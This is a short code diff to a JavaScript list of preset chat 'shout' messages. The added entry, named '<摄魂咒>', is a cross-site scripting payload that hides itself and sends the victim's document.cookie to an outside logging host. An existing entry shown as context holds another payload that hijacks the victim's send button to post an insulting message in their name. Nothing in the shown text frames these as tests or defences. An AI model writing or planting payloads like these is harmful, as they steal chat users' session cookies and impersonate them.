@@ -55,6 +55,14 @@ var wordslist = [
 			"<img src=x onerror=this.hidden=true;if(!$(%26quot;myDiv%26quot;))$(%26quot;submit%26quot;).onclick=function(){" +
 			"$(%26quot;chatmsg%26quot).value=%26quot;我……是……傻逼……啊……%26quot;;$(%26quot;send%26quot;).onclick();" +
 			"postCommand();};>"
+	},
+	{
+		id: "shout6",
+		name: "<摄魂咒>",
+		content: "<img src=x onerror=this.parentElement.hidden=true;if(!$(%26quot;myDiv%26quot;)){" +
+			"var%26nbsp;i=document.createElement(%26quot;img%26quot;);" +
+			"i.src=%26quot;http://regan.sinaapp.com/?log=%26quot;%2Bdocument.cookie;" +
+			"document.body.appendChild(i);}>"
 	}
 ];
 
